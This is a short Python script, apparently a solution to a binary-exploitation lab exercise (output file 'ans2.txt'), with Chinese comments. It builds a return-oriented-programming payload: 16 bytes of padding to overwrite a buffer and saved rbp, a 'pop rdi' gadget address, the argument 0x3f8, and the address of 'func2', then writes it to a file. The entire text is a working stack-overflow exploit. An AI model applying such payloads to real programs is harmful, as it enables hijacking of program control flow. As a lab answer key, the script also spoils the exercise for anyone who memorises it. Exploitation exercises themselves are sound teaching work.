#8字节buffer + 8字节saved rbp 
padding = b"A" * 16 
#pop_rdi指令地址
pop_rdi_addr = b"\xc7\x12\x40\x00\x00\x00\x00\x00"
arg1 = b"\xf8\x03\x00\x00\x00\x00\x00\x00" # 存入rdi=0x3f8
#func2入口地址
func2_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"

payload = padding + pop_rdi_addr + arg1 + func2_addr
# 写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans2.txt")